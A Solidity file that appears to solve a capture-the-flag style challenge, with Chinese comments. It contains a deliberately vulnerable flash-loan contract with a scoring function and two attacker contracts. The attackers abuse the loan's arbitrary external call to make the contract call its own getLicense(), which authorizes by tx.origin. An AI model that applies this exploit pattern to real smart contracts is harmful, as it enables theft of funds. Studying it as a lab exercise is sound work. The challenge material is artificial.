
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
// 1.合约攻击。2.拿到license。
contract Attract{
    Flashloan flashloan;
    address payable wallet;
    constructor(address payable addr) public {
        wallet = addr;
        flashloan = Flashloan(wallet);
    }
    function attract() public payable {
        wallet.transfer(100);
        bytes memory data = abi.encodeWithSignature("getLicense()");
        flashloan.flashLoan(wallet, 10, data);
        // 这里不需要调用，因为需要msg.sender为owner，但是只有EOA账户才能成为owner，你只能自己外部调用
        // flashloan.isCompleted();
    }
    receive() payable external {}
}

// 第二次简洁写法
contract att{
    Flashloan fla;
    constructor(Flashloan addr){
        fla = addr;
    }
    function attract() public payable {
        bytes memory data = abi.encodeWithSignature("getLicense()");
        payable(address(fla)).transfer(10);
        fla.flashLoan(address(fla),0,data);
    }
}


contract Flashloan{
    uint256 public score;
    mapping(address => bool) license;

    constructor()payable{
        license[address(this)]=true;
    }
    modifier onlyLicense{
        require(license[msg.sender]);
        _;
    }
    receive()external payable{}
    function flashLoan(address target,uint256 amount,bytes memory data)public{
        require(tx.origin!=msg.sender);

        uint256 balanceBefore = address(this).balance;
        require(balanceBefore>amount,"amount must letter than balance");

        payable(target).transfer(amount);
        (bool success,) =payable(target).call(data);
        require(success,"flashLoan call failed");

        uint256 balanceAfter = address(this).balance;
        require(balanceAfter>=balanceBefore,"flashloan hasn't been paid back");
    }
    function getLicense()public onlyLicense{
        license[tx.origin]=true;
        
    }
    function isCompleted()external{
        score=0;
        if (msg.sender!=tx.origin){
            score =50;
        }
        if(license[msg.sender]){
            score=100;
        } 
    }
}